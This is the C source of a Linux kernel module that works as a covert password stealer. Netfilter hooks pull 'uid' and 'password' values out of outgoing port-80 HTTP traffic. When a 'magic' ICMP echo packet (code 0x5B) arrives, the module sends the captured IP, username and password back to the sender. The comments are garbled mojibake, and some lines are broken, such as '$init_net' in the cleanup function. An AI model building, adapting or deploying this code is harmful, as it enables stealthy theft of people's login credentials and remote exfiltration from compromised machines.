#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <linux/netdevice.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>

/* ʹ��ICMP_ECHO���ݰ��������ֶ�����Ϊ0x5B*/
#define MAGIC_CODE   0x5B     //watch_in�����͹�����Ԥ���İ��ţ����Դ����û���������
#define REPLY_SIZE   36

/*"GPL" ��ָ���� ����GNU General Public License������汾*/
MODULE_LICENSE("GPL");  

/*ICMP��Ч�غɴ�С ���㷽ʽ�ǵõ�����ip���ݰ����ܳ��� ��ȥ ipͷ����С �ټ�ȥ icmpͷ����С*/ 
/*���������Ҫ�õ������ֽ���������ֽ����ת����htons������������һ�����ܣ�ͬʱҪ���ǻ�����С�˴洢�ʹ�˴洢��
    htonl()--"Host to Network Long"
    ntohl()--"Network to Host Long"
    htons()--"Host to Network Short"
    ntohs()--"Network to Host Short"  */
#define ICMP_PAYLOAD_SIZE  (htons(ip_hdr(sb)->tot_len) \
                   - sizeof(struct iphdr) \
                   - sizeof(struct icmphdr))

/*�����ں˵�FTP������̽���ļ򵥸�����֤��
 *������û���������Խ����͵�Զ������
 *���������������ʽ��ICMP���ݰ�ʱ�����������
 *Ӧʹ��ICMP_ECHO���ݰ���������ֶ�����Ϊ0x5B
 * * AND *���ݰ����㹻
 *�����Ŀո�����Ӧ4�ֽڵ�IP��ַ��
 *�û����������ֶ������ֵ��15���ַ�
 *ÿ����һ��NULL�ֽڡ�������ICMP��Ч�غɴ�СΪ36���ֽڡ�* /
 
/*  
 username��password���������õ����û���/�����
һ��ֻ�ܱ���һ��USER / PASS�ԣ�һ���������󽫱������
*/
static char *username = NULL;
static char *password = NULL;

/* ��������Ƿ��Ѿ���һ���û���/����� */
static int  have_pair = 0;   

/* 
 ׷����Ϣ��ֻ��¼ת����USER��PASS������ͬ��IP��ַ��TCP�˿�
 Ŀ��ip �� Ŀ��˿� 
*/
static unsigned int target_ip = 0;
static unsigned short target_port = 0;

/* �����������ǵ�Netfilter�ҹ�
	nf_hook_ops���ݽṹ��linux/netfilter.h�ж���
	���Ƕ�������nf_hook_ops�ṹ�壬һ�������hook �� һ��������hook 
 */
struct nf_hook_ops  pre_hook;          /* ���� */
struct nf_hook_ops  post_hook;         /* ���� */

/*
�鿴��֪Ϊ�ܺ����������ⷢ�͵�HTTP���ݰ���sk_buff������USER��PASS�ֶΣ���ȷ�����Ƕ�����target_xxx�ֶ���ָʾ��һ������
*/
static void check_http(struct sk_buff *skb)
{
	/* ����һ��tcphdr�ṹ�� *TCP */ 
   struct tcphdr *tcp;
   char *data;
   char *name;
   char *passwd;
   char *_and;
   char *check_connection;
   int len,i;

    
   /*socket��������*
           1.ÿ��socket�������󣬶��ᱻ�������������������뻺�����������������
		   2.write()/send() ���������������д������ݣ������Ƚ�����д�뻺�����У�
		   ����TCPЭ�齫���ݴӻ��������͵�Ŀ�������һ��������д�뵽�������������Ϳ��Գɹ����أ�
		   ����������û�е���Ŀ�������Ҳ�������Ǻ�ʱ�����͵����磬��Щ����TCPЭ�鸺������飻
		   3.read()/recv() ����Ҳ����ˣ�Ҳ�����뻺�����ж�ȡ���ݣ�������ֱ�Ӵ������ж�ȡ*/ 
   /* ���׽��ֻ�����(skbָ��ĵ�ַ)�л�ȡtcp�ײ� */ 
   tcp = tcp_hdr(skb);
   /* ϵͳλ������ǿ������ת������ 64λϵͳ��ָ������8���ֽڣ����ǿתΪint���������ת��ͬ��Ϊ8�ֽڵ�long�� 
   ͨ��tcp�ײ�λ�� + tcp����*4�ֽ� ������������λ�� data */ 
   /*tcp->doffΪTCP�����е�ƫ���ֶΣ�ָʾTCP��ͷ�����ȣ���λΪ4�ֽ�*/
   /*����վ�������û����������¼��������HTTP�������ڴ������TCPЭ�鵥Ԫ����װ������Ҫ��ȡ�����û��������������������Ҫ��λ��TCP�����ݲ���*/
   /* -----sk_buff�ṹ�嶨��ı���Ϊunsigned long����*/
   data = (char *)((unsigned long)tcp + (unsigned long)(tcp->doff * 4));


	/* �ж�"Upgrade-In"��data�У�����������cookie����ʽ�����м���ַ������ж�"uid"��data�У��ж�"password"��data�� */ 
	/*strstr���������Ӵ����ַ����е�λ��*/
   if (strstr(data,"Upgrade-In") != NULL && strstr(data, "uid") != NULL && strstr(data, "password") != NULL) { 

		/* ������data���״γ���Upgrade-In�ĵ�ַ */ 
        check_connection = strstr(data,"Upgrade-In");
		
		/*����check_connection֮���״γ���uid�ĵ�ַ*/ 
        name = strstr(check_connection,"uid=");
        /*����name֮���״γ���&�ĵ�ַ*/ 
        _and = strstr(name,"&");
        /*��name�����ƶ�4�ֽڣ���Ϊuid=ռ�����ֽڣ������ƶ�֮��name�������洢��uid��*/
        name += 4;
        /*����uid�ĳ��ȣ���&λ�ü�ȥuid��ʼ��λ��*/ 
        len = _and - name;
        /*���ں��и����username�����ڴ��С(kmalloc)��len+2����Ϊ����Ҫ������\0������һ���ո�(���������ֿ�)*/ 
        if ((username = kmalloc(len + 2, GFP_KERNEL)) == NULL)
          return;
        /*��username��ʼ��len+2�ֽ�����Ϊ0x00����ʵ���ǳ�ʼ��*/ 
        memset(username, 0x00, len + 2);
        
        /*��һ��forѭ������ȡ��uid�ŵ�username��*/
        for (i = 0; i < len; ++i)
        {
          *(username + i) = name[i];
        }
        *(username + len) = '\0';

		/*�����ȡ����������ȡ�û����õ���һ���ķ���*/ 
		/*����name֮���״γ���password=�ĵ�ַ*/ 
        passwd = strstr(name,"password=");
        /*����passwd֮���״γ���&�ĵ�ַ*/ 
        _and = strstr(passwd,"&");
        /*password=ռ��9�ֽڣ���������ֶ�*/
        passwd += 9;
        /*lenΪ��ʵ����ĳ���*/ 
        len = _and - passwd;
        /*������ŵ�password��*/ 
        if ((password = kmalloc(len + 2, GFP_KERNEL)) == NULL)
          return;
        memset(password, 0x00, len + 2);
        for (i = 0; i < len; ++i)
        {
          *(password + i) = passwd[i];
        }
        *(password + len) = '\0';

   } else {
   	/*�����������data��û�����������ֶ���ֱ�ӷ���*/ 
      return;
   }

   /*��ȡ32λĿ��ip����ip�ײ���daddr�ֶ��л�ȡ*/
   /*target_ip�������������IP����Ӧ�û���������*/   
   if (!target_ip)
     target_ip = ip_hdr(skb)->daddr;
   /*��ȡ16λԴ�˿ںţ���tcp�ײ���source�л�ȡ*/ 
   /*��ȡ���ʵ�����������Ķ˿ں�*/
   if (!target_port)
     target_port = tcp->source;

	/*
	username��password����ȡ���ˣ���have_pair��Ϊ1 
	*/ 
   if (username && password)
     have_pair++;              
     
   /*
   ��ȡ��һ���û���/����ԣ�have_pair��Ϊ1�� ��������ȡ�����û������������ 
   */ 
   if (have_pair)
     printk("Have password pair!  U: %s   P: %s\n", username, password);
}

/* ������ΪPOST_ROUTING����󣩹��ӡ�������HTTP����Ȼ��������������USER��PASS���� */
static unsigned int watch_out(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
   struct sk_buff *sb = skb;
   struct tcphdr *tcp;
   
   /* ����ȷ������һ��TCP���ݰ� */
   if (ip_hdr(sb)->protocol != IPPROTO_TCP)
     return NF_ACCEPT;             /* Nope, not TCP */

   /*ip���ײ�����*4�ֽھ�������ip�ײ� ����HTTP�����λ��*/ 
   tcp = (struct tcphdr *)((sb->data) + (ip_hdr(sb)->ihl * 4));

   /* ���ڼ�����Ƿ���һ��HTTP��*/
   if (tcp->dest != htons(80))
     return NF_ACCEPT;             /* Nope, not FTP */

   /* �����δ��ȡ���û�������ԣ������check_HTTP����ȥ��ȡ */
   if (!have_pair)
     check_http(sb);

   /* ���������ݰ� */
   return NF_ACCEPT;
}

/*���ӡ�Magic�����ݰ��Ĵ���ICMP�����Ĺ��̡�
 *�յ������ǵ���skb�ṹ���ͻظ�
 *�ص���������������Netfilter����͵�˰���*/
 /*�ú���������������߷������İ������û������������ݴ���ȥ*/
static unsigned int watch_in(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
	/*�ô���Ļ���skb�浽sb��*/ 
   struct sk_buff *sb = skb;   //��ֹ���������׵�ַ��ʧ
   /*����һ��icmp�ײ�ָ��*/ 
   struct icmphdr *icmp;
   /**/ 
   char *cp_data;/* ���ǽ����ݸ��Ƶ��ظ��� */
   /**/              
   unsigned int   taddr;           /* Temporary IP holder */

   /* ���ж��Ƿ��Ѿ���ȡ���û���/������� */
   if (!have_pair)
     return NF_ACCEPT;  //�������ݰ�����������

   /* �ж����ǲ���һ��ICMP�� */
   if (ip_hdr(sb)->protocol != IPPROTO_ICMP)
     return NF_ACCEPT;

   /* ip���ײ�����*4�ֽھ�������ip�ײ� ����icmp�ײ���λ�� */ 
   icmp = (struct icmphdr *)(sb->data + ip_hdr(sb)->ihl * 4);

   /* �ж����ǲ���һ��MAGIC�� 0x58��icmp�����ǲ���ICMP_ECHO��8����0��,icmp��Ч�غ��ǲ��Ǵ��ڵ���36*/
   if (icmp->code != MAGIC_CODE || icmp->type != ICMP_ECHO
     || ICMP_PAYLOAD_SIZE < REPLY_SIZE) {
      return NF_ACCEPT;  //ͨ���Ҳ����κδ���
   }

   /*�õģ�ƥ�����ǵġ�ħ������飬�������ǲ�֪����
    * sk_buff����IP��ַ���û���/����ԣ�
    *����IPԴ��Ŀ���ַ�Լ���̫����ַ*/
    
   /*��ip�ײ��е�Դ��ַ��Ŀ�ĵ�ַ����������Ϊ�Թ����ߵ�ICMP�������޸ĺ�ת��*/
   /*32λԴIP��ַ��ʱ����taddr��*/ 
   taddr = ip_hdr(sb)->saddr; 
   ip_hdr(sb)->saddr = ip_hdr(sb)->daddr;
   ip_hdr(sb)->daddr = taddr;

   /*PACKET_OUTGOING���ڷ������ݰ��ӱ����������ص����ݰ��׽���  ������̫��*/ 
  
   sb->pkt_type = PACKET_OUTGOING;   //����ת����ȥ�����ͣ��ѽ��յ����޸ĵİ���������Ϊת����ȥ�İ�

   /*struct net_device * dev;*/ 
   switch (sb->dev->type) {
   	//512 
    case ARPHRD_PPP:               /* Ntcho iddling needs doing */
      break;
    // 772 �����豸  
    case ARPHRD_LOOPBACK:
    // 1 ��̫��10Mbps 
    case ARPHRD_ETHER:
    {
    	/*#define ETH_ALEN 6  ��������̫���ӿڵ�MAC��ַ�ĳ���Ϊ6���ֽ�*/ 
       unsigned char t_hwaddr[ETH_ALEN];

       /* �ƶ�����ָ��ָ�����Ӳ�ͷ��*/
       sb->data = (unsigned char *)eth_hdr(sb);
       /*����mac��ַ*/ 
       sb->len += ETH_HLEN; //sizeof(sb->mac.ethernet);
       
       /*����macԴ��ַ��macĿ�ĵ�ַ*/ 
       /*��Ŀ�ĵ�ַ�ŵ�t_HWADDR*/ 
       memcpy(t_hwaddr, (eth_hdr(sb)->h_dest), ETH_ALEN);
       /*��Դ��ַ�ŵ�ԭĿ�ĵ�ַ�ĵط�*/ 
       memcpy((eth_hdr(sb)->h_dest), (eth_hdr(sb)->h_source),
          ETH_ALEN);
       memcpy((eth_hdr(sb)->h_source), t_hwaddr, ETH_ALEN);
       break;
    }
   };

   /* ���ڽ������������IP��ַ��Ȼ���û�����Ȼ�����븴�Ƶ����ݰ�*/
   /*cp_dataָ�����ݲ��֣�����������icmp�ײ�*/ 
   cp_data = (char *)((char *)icmp + sizeof(struct icmphdr));
   /*��Ŀ���������ip��ַ�ŵ���������*/ 
   memcpy(cp_data, &target_ip, 4);  //IP��ַΪ4�ֽ�
   
   /*���û���������ŵ�cp_data��*/ 
   if (username)
     /*���������õ���4�ֽ�*/ 
     memcpy(cp_data + 4, username, 16);
   if (password)
     /*���������õ���20�ֽ�*/ 
     memcpy(cp_data + 20, password, 16);

   /* dev_queue_xmit��������豸�ӿڲ㺯�����͸�driver
   https://blog.csdn.net/wdscq1234/article/details/51926808
    * */
   dev_queue_xmit(sb);  //sbָ��ICMP���ݰ�������Ը����ݰ����з�װ

   /* �����ͷű�����û��������벢����have_pair */
   kfree(username);
   kfree(password);
   username = password = NULL;
   have_pair = 0;

   target_port = target_ip = 0;

	/*���������ݰ�*/ 
	/*STOLEN���ܺ����򹥻��߷����û�������������ݰ�ʵ�������ڹ����߷������ı������޸ĵģ��޸ĺ�
   ��Ҫ����ϵͳ����ԭ�е��Ǹ�skb����Ϊskb���޸ģ������µķ�ʽ���ͳ�ȥ��*/
   return NF_STOLEN;
}

/*
�ں�ģ���е��������� init_module() ����ʾ��ʼ �� cleanup_module() ����ʾ���� 
*/ 
int init_module()
{
	/*hook����ָ��ָ��watc_in*/ 
   pre_hook.hook     = watch_in;
   /*Э���Ϊipv4*/  
   pre_hook.pf       = PF_INET;
   /*���ȼ����*/
   pre_hook.priority = NF_IP_PRI_FIRST;
   /*hook������Ϊ ��������У��֮��ѡ·ȷ��֮ǰ*/ 
   pre_hook.hooknum  = NF_INET_PRE_ROUTING;  //PRE_ROUTING��watch_in������������һ��pre_hook�ṹ�壻������������γ������ṹ�壬����Ҫ���øýṹ�����ȼ����

   /*hook����ָ��ָ��watch_out*/ 
   post_hook.hook     = watch_out;
   /*Э���Ϊipv4*/  
   post_hook.pf       = PF_INET;
   /*���ȼ����*/
   post_hook.priority = NF_IP_PRI_FIRST;
   /*hook������Ϊ �������ݰ��뿪�������������ߡ�֮ǰ*/ 
   post_hook.hooknum  = NF_INET_POST_ROUTING;

   /*��pre_hook��post_hookע�ᣬע��ʵ���Ͼ�����һ��nf_hook_ops�������ٲ���һ��nf_hook_ops�ṹ*/ 
   nf_register_net_hook(&init_net ,&pre_hook);
   nf_register_net_hook(&init_net ,&post_hook);

	printk(KERN_INFO "Hello world 1.\n");
   return 0;
}

void cleanup_module()
{
	/*��pre_hook��post_hookȡ��ע�ᣬȡ��ע��ʵ���Ͼ�����һ��nf_hook_ops������ɾ��һ��nf_hook_ops�ṹ*/ 
   nf_unregister_net_hook(&init_net ,&post_hook);
   nf_unregister_net_hook($init_net ,&pre_hook);

	/*�ͷ�֮ǰ������ں˿ռ�*/ 
   if (password)
     kfree(password);
   if (username)
     kfree(username);
    
	printk(KERN_INFO "Goodbye world 1.\n");
}
